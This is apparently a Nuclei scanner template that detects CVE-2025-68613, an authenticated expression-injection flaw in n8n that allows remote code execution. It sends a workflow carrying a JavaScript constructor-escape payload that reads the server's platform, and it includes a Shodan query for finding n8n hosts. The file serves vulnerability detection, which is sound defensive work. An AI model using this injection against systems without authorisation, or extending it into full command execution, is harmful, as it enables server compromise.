id: CVE-2025-68613

info:
  name: n8n - Expression Injection (RCE)
  author: MuhamadJuwandi
  severity: critical
  description: |
    n8n versions before 1.27.3 are vulnerable to Expression Injection leading to Remote Code Execution (RCE) via the /rest/workflows endpoint. Authenticated attackers can inject malicious expressions into workflow nodes to execute arbitrary code on the server.
  reference:
    - https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp
    - https://github.com/projectdiscovery/nuclei-templates/issues/14483
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2025-68613
    cwe-id: CWE-94
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"n8n"
  tags: cve,cve2025,n8n,rce,authenticated

http:
  - raw:
      - |
        POST /rest/workflows HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{token}}

        {
          "name": "rce-test-{{randstr}}",
          "nodes": [
            {
              "parameters": {
                "value": "={{this.constructor.constructor('return process')().platform}}"
              },
              "name": "Set",
              "type": "n8n-nodes-base.set",
              "typeVersion": 2,
              "position": [
                250,
                300
              ]
            }
          ],
          "connections": {}
        }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"name":"rce-test-'
          - '"type":"n8n-nodes-base.set"'
        condition: and

      - type: regex
        part: body
        regex:
          - "(linux|darwin|win32|freebsd|openbsd|sunos|aix)"

      - type: status
        status:
          - 200
